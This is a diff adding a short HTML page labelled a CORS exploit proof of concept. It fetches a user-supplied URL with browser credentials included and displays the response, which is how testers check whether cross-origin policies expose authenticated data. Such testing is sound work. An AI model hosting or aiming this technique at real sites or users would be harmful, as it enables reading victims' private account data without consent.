@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>CORS PoC</title>
+</head>
+<body>
+  <h2>CORS Exploit PoC</h2>
+  <input type="text" id="target" placeholder="Enter target URL" style="width:300px;">
+  <button onclick="sendReq()">Send GET</button>
+  <pre id="output"></pre>
+
+  <script>
+    async function sendReq() {
+      let url = document.getElementById("target").value;
+      try {
+        let res = await fetch(url, {credentials: "include"});
+        let text = await res.text();
+        document.getElementById("output").innerText = text;
+      } catch (err) {
+        document.getElementById("output").innerText = "Error: " + err;
+      }
+    }
+  </script>
+</body>
+</html>
